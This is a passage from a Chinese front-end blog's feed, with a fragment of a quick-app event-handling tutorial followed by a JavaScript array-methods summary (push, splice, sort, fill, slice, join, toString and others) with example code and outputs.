class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tutorial-page"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">onclick</span>=<span class="string">"emitElement"</span>&gt;</span>触发组件节点的事件：click<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">id</span>=<span class="string">"elNode1"</span> <span class="attr">class</span>=<span class="string">"&#123;&#123; elClassName + 1 &#125;&#125;"</span> <span class="attr">disabled</span>=<span class="string">"false"</span> <span class="attr">onclick</span>=<span class="string">"onClickHandler"</span>&gt;</span>组件节点1<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">id</span>=<span class="string">"elNode2"</span> <span class="attr">class</span>=<span class="string">"class-static-1 &#123;&#123; elClassName + 2 &#125;&#125;"</span> <span class="attr">onclick</span>=<span class="string">"onClickHandler2('参数1', argName)"</span>&gt;</span>组件节点2<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"less"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.tutorial-page</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex-direction: column;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="undefined">    private: &#123;</span></span><br><span class="line"><span class="javascript">      elClassName: <span class="string">'class-dynamic'</span>,</span></span><br><span class="line"><span class="javascript">      argName: <span class="string">'动态参数'</span></span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    onClickHandler (evt) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 事件类型，参数详情</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.info(<span class="string">`触发事件：类型：<span class="subst">$&#123;evt.type&#125;</span>, 详情： <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(evt.detail)&#125;</span>`</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (evt.target) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.info(<span class="string">`触发事件：节点：<span class="subst">$&#123;evt.target.id&#125;</span>, <span class="subst">$&#123;evt.target.attr.disabled&#125;</span>`</span>)</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    onClickHandler2 (arg1, arg2, evt) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 事件类型，事件参数，target</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.info(<span class="string">`触发事件：类型：<span class="subst">$&#123;evt.type&#125;</span>, 参数： <span class="subst">$&#123;arg1&#125;</span>, <span class="subst">$&#123;arg2&#125;</span>`</span>);</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    emitElement () &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 注意：通过此类方式的事件不会携带target属性，开发者可以通过detail参数实现</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.$emitElement(<span class="string">'click'</span>, &#123; <span class="attr">params</span>: <span class="string">'参数内容'</span> &#125;, <span class="string">'elNode1'</span>)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="十三、一些问题"><a href="#十三、一些问题" class="headerlink" title="十三、一些问题"></a>十三、一些问题</h1><ul><li>自定义属性名不能采用驼峰命名，否则值永远是 <code>undefined</code></li><li><code>show</code> 属性并不好用，没起什么作用</li><li>类似 <code>onInit</code> 等等函数是页面生命周期，不是组件生命周期，不会因为组件状态变化而执行</li><li><code>display</code>类型只有 <code>flex</code> 和 <code>none</code></li><li>子盒子不能将父盒子撑高</li><li>不遵循盒子模型，类似但不完全等同于 <code>border-box</code></li></ul><h1 id="十四、快应用开发资源"><a href="#十四、快应用开发资源" class="headerlink" title="十四、快应用开发资源"></a>十四、快应用开发资源</h1><ul><li><a href="https://github.com/l455202325/APIDemo" target="_blank" rel="noopener">快应用API Demo 集合 QuickAPP</a></li><li><a href="https://github.com/yesvods/awesome-quick-app" target="_blank" rel="noopener">awesome-quick-app</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;MD原文件 &lt;a href=&quot;https://github.com/poetries/poetries.github.io/blob/dev/source/_posts/quick-app-summary.md&quot; target=&quot;_blank&quot; r
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="快应用" scheme="http://blog.poetries.top/tags/%E5%BF%AB%E5%BA%94%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript数组方法总结篇</title>
    <link href="http://blog.poetries.top/2018/08/18/javaScript-arr-summary/"/>
    <id>http://blog.poetries.top/2018/08/18/javaScript-arr-summary/</id>
    <published>2018-08-18T10:40:43.000Z</published>
    <updated>2018-08-23T01:41:37.483Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、数组预览图"><a href="#一、数组预览图" class="headerlink" title="一、数组预览图"></a>一、数组预览图</h3><p><img src="https://upload-images.jianshu.io/upload_images/1480597-3067afe2cc23ff1f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数组方法"></p><h3 id="二、会改变原数组的方法"><a href="#二、会改变原数组的方法" class="headerlink" title="二、会改变原数组的方法"></a>二、会改变原数组的方法</h3><h4 id="2-1-push"><a href="#2-1-push" class="headerlink" title="2.1 push()"></a>2.1 push()</h4><ul><li>方法在数组的尾部添加一个或多个元素，并返回数组的长度</li></ul><blockquote><p>参数: item1, item2, …, itemX ,要添加到数组末尾的元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> length = arr.push(<span class="string">'末尾1'</span>,<span class="string">'末尾2'</span>); <span class="comment">// 返回数组长度</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arr,length)</span><br><span class="line"></span><br><span class="line"><span class="comment">// [1, 2, 3, "末尾1", "末尾2"] 5</span></span><br></pre></td></tr></table></figure><blockquote><p>返回值： 数组的长度</p></blockquote><h4 id="2-2-pop"><a href="#2-2-pop" class="headerlink" title="2.2  pop()"></a>2.2  pop()</h4><ul><li>方法删除数组的最后一个元素，减小数组长度并返回它删除的值</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//组合使用push()和pop()能够用JavaScript数组实现先进后出的栈</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> stack = [];</span><br><span class="line"></span><br><span class="line">stack.push(<span class="number">1</span>,<span class="number">2</span>) <span class="comment">// 返回长度2，这时stack的值是[1,2]</span></span><br><span class="line"></span><br><span class="line">stack.pop() <span class="comment">// 返回删除的值2，这时stack的值是[1]</span></span><br></pre></td></tr></table></figure><blockquote><p>返回值： 从数组中删除的元素(当数组为空时返回undefined)。</p></blockquote><h4 id="2-3-unshift"><a href="#2-3-unshift" class="headerlink" title="2.3 unshift()"></a>2.3 unshift()</h4><blockquote><p>方法在数组的头部添加一个或多个元素，并将已存在的元素移动到更高索引的位置来获得足够的空间，最后返回数组新的长度</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> length = arr.unshift(<span class="number">1</span>,<span class="number">2</span>); <span class="comment">// 返回长度是5</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arr, length)</span><br><span class="line"></span><br><span class="line"><span class="comment">//[1, 2, 3, 4, 5] 5</span></span><br></pre></td></tr></table></figure><blockquote><p>返回值： 返回数组新的长度</p></blockquote><h4 id="2-4-shift"><a href="#2-4-shift" class="headerlink" title="2.4  shift()"></a>2.4  shift()</h4><blockquote><p>方法删除数组的第一个元素并将其返回，然后把所有随后的元素下移一个位置来填补数组头部的空缺，返回值是删除的元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> item = arr.shift(); <span class="comment">// 返回删除的值1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(arr, item)</span><br><span class="line"></span><br><span class="line"><span class="comment">// [2, 3] 1</span></span><br></pre></td></tr></table></figure><blockquote><p>返回值： 从数组中删除的元素; 如果数组为空则返回undefined</p></blockquote><h4 id="2-5-splice"><a href="#2-5-splice" class="headerlink" title="2.5 splice()"></a>2.5 splice()</h4><blockquote><p>方法是在数组中插入或删除元素的通用方法</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// start不超过数组长度(以下操作是连续的)</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">arr.splice(<span class="number">2</span>) <span class="comment">// arr是[1,2]，返回值是[3,4,5]</span></span><br><span class="line"></span><br><span class="line">arr.splice(<span class="number">1</span>,<span class="number">1</span>) <span class="comment">// arr是[1]，返回值是[2]</span></span><br><span class="line"></span><br><span class="line">arr.splice(<span class="number">0</span>,<span class="number">3</span>) <span class="comment">// arr是[]，返回值是[1],因为此时数组从第0位开始不够3位，所以是删除从0开始到最后的所有元素。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// start大于数组长度(以下操作是连续的)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">arr.splice(<span class="number">5</span>) <span class="comment">// arr是[1,2,3,4,5]，返回值是[]</span></span><br><span class="line"></span><br><span class="line">arr.splice(<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>) <span class="comment">// arr是[1,2,3,4,5,6]，返回值是[]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr.splice(<span class="number">5</span>,<span class="number">3</span>,<span class="number">7</span>) <span class="comment">// arr是[1,2,3,4,5,7] 返回值是[6]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// start是负数(以下操作是连续的)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">arr.splice(<span class="number">-3</span>,<span class="number">2</span>); <span class="comment">// arr是[1,2,5], 返回值是[3,4]</span></span><br><span class="line">arr.splice(<span class="number">-4</span>); <span class="comment">// arr是[],返回值是[1,2,5]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入数组时，是插入数组本身，而不是数组元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">arr.splice(<span class="number">1</span>,<span class="number">0</span>,[<span class="number">2</span>,<span class="number">3</span>]) <span class="comment">// arr是[1,[2,3],4,5]，返回值是[]</span></span><br></pre></td></tr></table></figure><h4 id="2-6-sort"><a href="#2-6-sort" class="headerlink" title="2.6 sort()"></a>2.6 sort()</h4><blockquote><p><code>sort()</code> 方法将数组中的元素排序并返回排序后的数组</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> stringArray = [<span class="string">"Blue"</span>, <span class="string">"Humpback"</span>, <span class="string">"Beluga"</span>];</span><br><span class="line"><span class="keyword">var</span> numberArray = [<span class="number">40</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">200</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compareNumbers</span>(<span class="params">a, b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'stringArray:'</span> + stringArray.join());</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Sorted:'</span> + stringArray.sort());</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'numberArray:'</span> + numberArray.join());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 没有使用比较函数时，数字并不会按照我们设想的那样排序</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Sorted without a compare function:'</span>+ numberArray.sort());</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Sorted with compareNumbers:'</span>+ numberArray.sort(compareNumbers));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//打印如下</span></span><br><span class="line"><span class="comment">// stringArray: Blue,Humpback,Beluga</span></span><br><span class="line"><span class="comment">// Sorted: Beluga,Blue,Humpback</span></span><br><span class="line"><span class="comment">// numberArray: 40,1,5,200</span></span><br><span class="line"><span class="comment">// Sorted without a compare function: 1,200,40,5</span></span><br><span class="line"><span class="comment">// Sorted with compareNumbers: 1,5,40,200</span></span><br></pre></td></tr></table></figure><blockquote><p>返回值： 返回排序后的数组。原数组已经被排序后的数组代替</p></blockquote><h4 id="2-7-reverse"><a href="#2-7-reverse" class="headerlink" title="2.7  reverse()"></a>2.7  reverse()</h4><blockquote><p>方法将数组中的元素颠倒顺序，返回逆序的数组</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">arr.reverse() <span class="comment">// arr是[3,2,1]，返回值是[3,2,1]</span></span><br></pre></td></tr></table></figure><blockquote><p>返回值： 返回顺序颠倒后的数组。原数组已经被排序后的数组代替</p></blockquote><h4 id="2-8-fill"><a href="#2-8-fill" class="headerlink" title="2.8 fill()"></a>2.8 fill()</h4><blockquote><p>方法用一个固定值填充一个数组中从起始索引到终止索引内的全部元素</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.fill(value[, start[, end]])</span><br></pre></td></tr></table></figure><ul><li><code>value</code> 用来填充数组元素的值。</li><li><code>start</code> (可选) 起始索引，默认值为0。</li><li><code>end</code> (可选) 终止索引，默认值为 this.length。</li><li>如果 start 是个负数, 则开始索引会被自动计算成为 <code>length+start</code>, 其中 length 是 this 对象的 <code>length</code>属性值. 如果 end 是个负数, 则结束索引会被自动计算成为 <code>length+end</code></li></ul><blockquote><p>返回值： 修改后的数组</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].fill(<span class="number">4</span>); <span class="comment">// [4, 4, 4]</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].fill(<span class="number">4</span>, <span class="number">1</span>); <span class="comment">// [1, 4, 4]</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].fill(<span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>); <span class="comment">// [1, 4, 3]</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].fill(<span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>); <span class="comment">// [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].fill(<span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>); <span class="comment">// [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].fill(<span class="number">4</span>, <span class="number">-3</span>, <span class="number">-2</span>); <span class="comment">// [4, 2, 3]</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].fill(<span class="number">4</span>, <span class="literal">NaN</span>, <span class="literal">NaN</span>); <span class="comment">// [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].fill(<span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>); <span class="comment">// [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>(<span class="number">3</span>).fill(<span class="number">4</span>); <span class="comment">// [4, 4, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fill 方法故意被设计成通用方法, 该方法不要求 this 是数组对象。</span></span><br><span class="line"></span><br><span class="line">[].fill.call(&#123; <span class="attr">length</span>: <span class="number">3</span> &#125;, <span class="number">4</span>); <span class="comment">// &#123;0: 4, 1: 4, 2: 4, length: 3&#125;</span></span><br></pre></td></tr></table></figure><h3 id="三、不改变原数组的方法"><a href="#三、不改变原数组的方法" class="headerlink" title="三、不改变原数组的方法"></a>三、不改变原数组的方法</h3><h4 id="3-1-slice"><a href="#3-1-slice" class="headerlink" title="3.1 slice()"></a>3.1 slice()</h4><blockquote><p>方法返回一个从开始到结束（不包括结束）选择的数组的一部分浅拷贝到一个新数组对象。且原始数组不会被修改</p></blockquote><ul><li>返回值： 一个含有提取元素的新数组</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr1 = arr.slice(<span class="number">1</span>,<span class="number">3</span>); <span class="comment">// arr是[1,2,3,4,5]， arr1是[2,3]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr2 = arr.slice(<span class="number">-2</span>,<span class="number">-1</span>); <span class="comment">// arr是[1,2,3,4,5], arr2是[4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 开始位置在结束位置后面，得到的数组是空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr3 = arr.slice(<span class="number">-2</span>, <span class="number">-3</span>); <span class="comment">// arr是[1,2,3,4,5], arr3是[]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr4 = arr.slice(<span class="number">2</span>, <span class="number">1</span>); <span class="comment">// arr是[1,2,3,4,5], arr4是[]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果元素是个对象引用 （不是实际的对象），slice 会拷贝这个对象引用到新的数组里。两个对象引用都引用了同一个对象。如果被引用的对象发生改变，则新的和原来的数组中的这个元素也会发生改变。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [&#123;<span class="attr">name</span>: <span class="string">'xiaoming'</span>&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr1 = arr.slice(); <span class="comment">// arr是[&#123;name: xiaoming&#125;]，arr1是[&#123;name: 'xiaoming'&#125;]</span></span><br><span class="line"></span><br><span class="line">arr1[<span class="number">0</span>].name = <span class="string">'xiaogang'</span>; <span class="comment">// arr是[&#123;name: 'xiaogang'&#125;]，arr1是[&#123;name: 'xiaogang'&#125;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对于字符串、数字及布尔值来说（不是 String、Number 或者 Boolean 对象），slice 会拷贝这些值到新的数组里。在别的数组里修改这些字符串或数字或是布尔值，将不会影响另一个数组。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr1 = arr.slice(); <span class="comment">// arr是[1,2,3]，arr1是[1,2,3]</span></span><br><span class="line"></span><br><span class="line">arr1[<span class="number">1</span>] = <span class="string">"two"</span>; <span class="comment">// arr是[1,2,3]，arr1是[1,"tow",3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当然，如果向两个数组任一中添加了新元素（简单或者引用类型），则另一个不会受到影响</span></span><br></pre></td></tr></table></figure><h4 id="3-2-join"><a href="#3-2-join" class="headerlink" title="3.2  join()"></a>3.2  join()</h4><blockquote><p>方法将数组（或一个类数组对象）中所有元素都转化为字符串并连接在一起，返回最后生成的字符串</p></blockquote><ul><li>返回值： 一个所有数组元素连接的字符串。如果 arr.length 为0，则返回空字符串</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> str1 = num.join(); <span class="comment">// 1,2,3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> str2 = num.join(<span class="string">', '</span>) <span class="comment">// 1, 2, 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> str3 = num.join(<span class="string">''</span>) <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//所有的数组元素被转换成字符串，再用一个分隔符将这些字符串连接起来。如果元素是undefined 或者null， 则会转化成空字符串。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> num = [<span class="number">1</span>,<span class="literal">null</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> str1 = num.join(); <span class="comment">// 1,,3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果数组中的元素是数组，会将里面的数组也调用join()</span></span><br><span class="line"><span class="keyword">let</span> num = [[<span class="number">1</span>,<span class="number">2</span>],<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> str1 = num.join(<span class="string">'-'</span>); <span class="comment">// 1,2-3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果数组中的元素是对象，对象会被转为[object Object]字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> num = [&#123;<span class="attr">num</span>: <span class="number">1</span>&#125;,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> str1 = num.join(<span class="string">'-'</span>); <span class="comment">// [object Object]-2-3</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 扁平化简单的二维数组</span></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">11</span>, [<span class="number">22</span>, <span class="number">33</span>], [<span class="number">44</span>, <span class="number">55</span>], <span class="number">66</span>];</span><br><span class="line"><span class="keyword">const</span> flatArr = arr.join().split(<span class="string">','</span>); <span class="comment">// ["11", "22", "33", "44", "55", "66"]</span></span><br></pre></td></tr></table></figure><h4 id="3-3-toString"><a href="#3-3-toString" class="headerlink" title="3.3 toString()"></a>3.3 toString()</h4><blockquote><p>方法将数组的每个元素转化为字符串(如有必要将调用元素的<code>toString()</code>方法)并且输出用逗号分割的字符串列表。返回一个字符串表示数组中的元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].toString(); <span class="comment">// 1,2,3</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>,[<span class="number">2</span>,<span class="string">'c'</span>]].toString(); <span class="comment">//1,2,c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上与不使用任何参数调用join()方法返回的字符串是一样的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 以下的这个例子要跟下面的toLocaleString对照看</span></span><br><span class="line"></span><br><span class="line">[&#123;<span class="attr">a</span>:<span class="number">1</span>&#125;,<span class="number">1</span>,<span class="keyword">new</span> <span class="built_in">Date</span>()].toString() <span class="comment">//"[object Object],1,Sat Jul 07 2018 18:43:45 GMT+0800 (中国标准时间)"</span></span><br></pre></td></tr></table></figure><blockquote><p>注意： 当数组和字符串操作的时候，js 会调用这个方法将数组自动转换成字符串</p></blockquote><figure class="highlight plain"><table><tr><td 